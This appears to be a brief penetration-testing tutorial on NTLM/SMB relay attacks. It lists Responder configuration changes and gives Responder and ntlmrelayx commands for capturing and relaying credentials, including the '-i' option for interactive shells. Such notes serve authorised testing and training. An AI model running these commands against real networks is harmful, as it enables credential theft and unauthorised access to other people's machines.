### Tooling
1. Responder
2. NTLMRelayx

### Preparation
To perform SMB relay attacks we need to disable SMB and HTTP on responder, to do this we navigate to `/etc/responder/Responder.conf` and change the following

```txt
SMB = Off
HTTP = Off
```
We can then run responder as follows
```sh
responder -I eth0 -rdwv 
```
We can then set up NTLM relay by doing the following
```sh
ntlmrelayx.py -tf targets.txt -smb2support
```
You can then head on to your PC and connect to a computer that does not exist in the network and look at the results on ntlmrelayx

### Getting interactive shells
With the same configuration above we can start our NTLM relay using the following
```sh
ntlmrelayx.py -tf targets.txt -smb2support -i
```
